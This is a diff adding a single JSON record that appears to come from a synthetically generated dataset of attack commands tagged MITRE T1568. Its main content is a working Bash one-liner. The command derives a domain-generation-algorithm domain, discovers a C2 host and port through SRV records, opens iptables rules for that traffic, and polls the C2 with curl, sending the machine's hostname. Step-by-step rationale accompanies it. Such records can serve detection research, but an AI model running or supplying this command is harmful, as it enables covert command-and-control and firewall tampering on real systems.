@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'base=$(date -u +%Y%m%d | md5sum | cut -c1-10).net-sync.cc; srv=$(dig +short _c2._tcp.$base SRV | head -n1); target=$(awk \"{print $4}\" <<<\"$srv\"); port=$(awk \"{print $3}\" <<<\"$srv\"); ip=$(dig +short A \"$target\" | head -n1); if [ -n \"$ip\" ] && [ -n \"$port\" ]; then iptables -I OUTPUT -p tcp -d \"$ip\" --dport \"$port\" -j ACCEPT; iptables -I INPUT -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS \"http://$target:$port/poll?node=$(hostname)\"; fi'",
+  "explanation": "Queries SRV records to dynamically discover the C2 host and port, resolves the target to IP, adds iptables rules for that IP:port, and polls the C2 path.",
+  "rationale_steps": [
+    "Construct base domain via DGA",
+    "Query SRV record for service endpoint and port",
+    "Resolve SRV target to an IP address",
+    "Allow traffic to the resolved IP:port via iptables",
+    "Poll C2 endpoint using the dynamically discovered port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-4b6829ad",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
